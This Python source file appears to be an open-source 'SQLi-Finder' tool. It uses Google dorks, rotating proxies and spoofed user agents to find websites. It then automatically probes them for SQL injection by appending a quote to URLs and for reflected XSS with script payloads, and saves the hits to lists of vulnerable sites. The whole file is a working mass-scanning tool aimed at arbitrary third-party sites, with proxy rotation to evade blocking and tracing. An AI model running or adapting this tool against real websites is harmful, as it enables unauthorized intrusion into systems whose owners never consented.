#/usr/bin/python3
from googlesearch import search
from socket import timeout
import sys
from termcolor import colored
import urllib
import urllib.request
import terminal_banner
import random
import os
import requests
import glob
import time
import threading
import concurrent.futures
import itertools
from tqdm import tqdm
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter

# Default values for search parameters
DEFAULT_EXTENSION = ""
DEFAULT_TOTAL_OUTPUT = 10
DEFAULT_PAGE_NO = 1

# XSS Test Payload
XSS_TEST_PAYLOAD = "<script>alert('XSS')</script>"


# Constants for handling requests and delays
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36',
    'Mozilla/5.0 (Linux; U; Android 10; en-us; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 13729.56.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (iPad; CPU OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Mobile Safari/537.36'
]


REQUEST_DELAY = 5  # Base delay between requests in seconds
# Initial delay and the factor by which the delay is multiplied
initial_delay = 10  # Start with a 10-second delay
delay_factor = 2  # Double the delay each time
max_delay = 600  # Maximum delay of 10 minutes

current_delay = initial_delay

# Define file paths
# Initialize locks for thread-safe file writing
lock_sqli = threading.Lock()
lock_xss  = threading.Lock()
sqli_file_path = "vulnerable_sqli_sites.txt"
xss_file_path  = "vulnerable_xss_sites.txt"


os. system('clear')

banner = ("""
                    
              ╔═╗╔═╗ ╦  ╦   ╔═╗╦╔╗╔╔╦╗╔═╗╦═╗
              ╚═╗║═╬╗║  ║───╠╣ ║║║║ ║║║╣ ╠╦╝
              ╚═╝╚═╝╚╩═╝╩   ╚  ╩╝╚╝═╩╝╚═╝╩╚═                          
                        Made with ❤️ 
            For the Community, By the Community   

            ###################################
                  Improve by ElNiak
            linkedin  - https://www.linkedin.com/in/christophe-crochet-5318a8182/ 
                Github - https://github.com/elniak
                
                
                  From  Jitesh Kumar
            Intagram  - https://instagram.com/jitesh.haxx
            linkedin  - https://linkedin.com/j1t3sh 
                Github - https://github.com/j1t3sh
                                    
       ( DONT COPY THE CODE. CONTRIBUTIONS ARE MOST WELCOME ❤️ )
                                                                                
""")
banner_terminal = terminal_banner.Banner(banner)
print (colored(banner_terminal, 'green')+ "\n")

# Load proxies from file
def load_proxies():
    with open('free-proxy-list.txt', 'r') as file:
        return [line.strip() for line in file if line.strip()]

# Load proxies from file
def load_xss_payload():
    payloads = {}
    for payload_file in glob.glob("payloads/xss/*"):
        # Extract the vulnerability type from the filename
        vuln_type = payload_file.split('/')[-1].replace('_xss_payload.txt', '')
        with open(payload_file, 'r') as file:
            # Assuming each file may contain multiple payloads, one per line
            payloads[vuln_type] = [line.strip() for line in file.readlines()]
    return payloads

# Proxy-aware Google search function
def google_search_with_proxy(dork_tuple, proxy, category, retries=3):
    try:
        query, extension = dork_tuple
    except ValueError:
        query = dork_tuple
        extension = ""
    full_query = f"{query} {extension}".strip()
    base_url = "https://www.google.com/search"
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    proxies = {'http': proxy, 'https': proxy}
    params = {'q': full_query}

    for _ in range(retries):
        try:
            print(colored(f"Searching for {full_query} with proxy {proxy}...", 'yellow'))
            response = requests.get(base_url, headers=headers, params=params, proxies=proxies, timeout=10)
            # Placeholder for URL extraction logic
            return category, response.url  # Return the category and a placeholder result
        except requests.exceptions.RequestException:
            time.sleep(2)  # Wait before retrying

    return category, None  # Indicate failure after retries

# Thread-safe addition to results lists
def safe_add_result(result, websites_sqli, websites_xss):
    category, url = result
    if url:
        if "https://www.google.com/sorry/" not in url:
            if category == "sqli":
                with lock_sqli:  # Ensure thread-safe write operation
                    with open(sqli_file_path, "a") as file:  # Open file in append mode
                        file.write(url + "\n")  # Write URL to file
                    websites_sqli.add(url)  # Optionally maintain the set
            elif category == "xss":
                with lock_xss:  # Ensure thread-safe write operation
                    with open(xss_file_path, "a") as file:  # Open file in append mode
                        file.write(url + "\n")  # Write URL to file
                    websites_xss.add(url)  # Optionally maintain the set

# Round-robin proxy generator
def round_robin_proxies(proxies):
    return itertools.cycle(proxies)

def load_dorks_and_search(extension=DEFAULT_EXTENSION, total_output=DEFAULT_TOTAL_OUTPUT, page_no=DEFAULT_PAGE_NO):
    dork_files = glob.glob("dorks/google/*")
    proxies = load_proxies()
    
    print(colored(f"Number of proxies available {len(proxies)}"))
    
    proxy_cycle = round_robin_proxies(proxies)
    
    websites_sqli = set()
    websites_xss  = set()
    lock = threading.Lock()  # To ensure thread-safe operations on sets

    search_tasks = []

    search_tasks_sqli = []
    search_tasks_xss = []

    for dork_file in dork_files:
        category = "sqli" if "sqli" in dork_file.lower() else "xss"
        with open(dork_file, 'r') as file:
            dorks = [(line.strip(), extension, category) for line in file if line.strip()]
        
        # Separate tasks by category before shuffling
        if category == "sqli":
            search_tasks_sqli.extend(dorks)
        elif category == "xss":
            search_tasks_xss.extend(dorks)

    # Now shuffle the dorks within each category
    random.shuffle(search_tasks_sqli)
    random.shuffle(search_tasks_xss)

    # Combine the tasks back together, maintaining category grouping
    search_tasks = search_tasks_sqli + search_tasks_xss

    search_tasks_with_proxy = []
    # Now, append a proxy to each task
    for task in search_tasks:
        dork, extension, category = task
        proxy = next(proxy_cycle)
        search_tasks_with_proxy.append((dork, proxy, category))
        
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        future_to_search = {
            executor.submit(google_search_with_proxy, task[0], task[1], task[2]): task for task in search_tasks_with_proxy
        }
        for future in tqdm(concurrent.futures.as_completed(future_to_search), total=len(future_to_search), desc="Searching for vulnerable website", unit="site"):
            result = future.result()
            if result:
                with lock:
                    safe_add_result(result, websites_sqli, websites_xss)

    return list(websites_sqli), list(websites_xss)

def get_user_input():
    """
    Collect user input for website extension, total output, and starting page number, with default values.
    """
    extension    = input(colored(f"Please specify the website extension(eg- .in,.com,.pk) [default: {DEFAULT_EXTENSION}] -----> ", 'cyan')) or DEFAULT_EXTENSION
    total_output = input(colored(f"Please specify the total no. of websites you want [default: {DEFAULT_TOTAL_OUTPUT}] ----> ", 'cyan')) or DEFAULT_TOTAL_OUTPUT
    page_no      = input(colored(f"From which Google page you want to start(eg- 1,2,3) [default: {DEFAULT_PAGE_NO}] ----> ", 'cyan')) or DEFAULT_PAGE_NO
    
    # Ensure numeric inputs are correctly converted to integers
    total_output = int(total_output)
    page_no      = int(page_no)
    
    return extension, total_output, page_no

def test_sqli_with_proxy(url_proxy):
    """
    Test a single website for SQL injection vulnerability using a specified proxy.
    """
    url, proxy = url_proxy
    proxies_dict = {"http": proxy, "https": proxy}
    test_url = url + "'"
    
    try:
        session = requests.Session()
        retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.mount('https://', HTTPAdapter(max_retries=retries))

        response = session.get(test_url, proxies=proxies_dict, timeout=15)
        if "SQL syntax" in response.text:
            return url, True  # Vulnerable
        else:
            return url, False  # Not Vulnerable
    except requests.RequestException as e:
        return url, None  # Error or can't determine

def test_vulnerability_sqli(websites):
    """
    Test a list of websites for SQL injection vulnerability using multithreading and proxies.
    """
    results = []
    # The code snippet provided is written in Python and performs the following tasks:
    proxies = load_proxies()
    
    print(colored(f"Number of proxies available {len(proxies)}"))
    
    proxy_cycle = round_robin_proxies(proxies)
    
    lock = threading.Lock()  # To ensure thread-safe operations on sets
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_url = {executor.submit(test_sqli_with_proxy, (website, next(proxy_cycle))): website for website in websites}
        for future in tqdm(concurrent.futures.as_completed(future_to_url), total=len(future_to_url), desc="Searching for vulnerable SQLi", unit="site"):
            url, result = future.result()
            if result is True:
                print(colored(f"{url} ===> Vulnerable!", 'green'))
                with lock:
                    results.append(url)  # Thread-safe append
            elif result is False:
                print(colored(f"{url} ===> Not Vulnerable", 'red'))
            else:
                print(colored(f"{url} ===> Can not be Determined", 'blue'))

    return results
            
def test_xss_with_proxy(url_proxy):
    """
    Test a single website for XSS vulnerability using a specified proxy.
    """
    url, proxy = url_proxy
    proxies_dict = {"http": proxy, "https": proxy}
    XSS_TEST_PAYLOAD = load_xss_payload()
    for payload_attack in XSS_TEST_PAYLOAD.keys():
        try:
            response = requests.get(url, params={'param': XSS_TEST_PAYLOAD[payload_attack]}, proxies=proxies_dict, timeout=15)
            if XSS_TEST_PAYLOAD[payload_attack] in response.text:
                return url, True  # Potentially Vulnerable
            else:
                return url, False  # Not Vulnerable
        except requests.RequestException as e:
            print(f"Error testing {url} for XSS with proxy {proxy}: {e}")
            return url, None  # Error or can't determine

def test_vulnerability_xss(websites):
    """
    Test a list of websites for XSS vulnerability using multithreading and proxies.
    """
    results = []
    proxies = load_proxies()
    
    print(colored(f"Number of proxies available {len(proxies)}"))
    
    proxy_cycle = round_robin_proxies(proxies)
    
    lock = threading.Lock()  # To ensure thread-safe operations on sets
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_url = {executor.submit(test_xss_with_proxy, (website, next(proxy_cycle))): website for website in websites}
        for future in tqdm(concurrent.futures.as_completed(future_to_url), total=len(future_to_url), desc="Searching for vulnerable XSS", unit="site"):
            url, result = future.result()
            if result is True:
                print(colored(f"{url} ===> Potentially Vulnerable to XSS!", 'green'))
                with lock:
                    results.append(url)  # Thread-safe append
            elif result is False:
                print(colored(f"{url} ===> Not Vulnerable to XSS", 'red'))
            else:
                print(colored(f"{url} ===> Can not be Determined", 'blue'))

    return results

if __name__ == "__main__":
    if len(sys.argv) > 3:
        extension    = sys.argv[1]
        total_output = int(sys.argv[2])
        page_no      = int(sys.argv[3])
    else:
        extension, total_output, page_no = get_user_input()
        
    website_list_sqli,  website_list_xss = load_dorks_and_search(extension, total_output, page_no)
    
    if not website_list_sqli and not website_list_xss:
        print("No websites found matching the dorks. Please adjust your search criteria.")
    else:
        if website_list_sqli:
            print(colored("\nTesting websites for SQL injection vulnerability...\n", 'yellow'))
            vuln_sqli = test_vulnerability_sqli(website_list_sqli)
        if website_list_xss:
            print(colored("\nTesting websites for XSS vulnerability...\n", 'yellow'))
            vuln_xss = test_vulnerability_xss(website_list_xss)
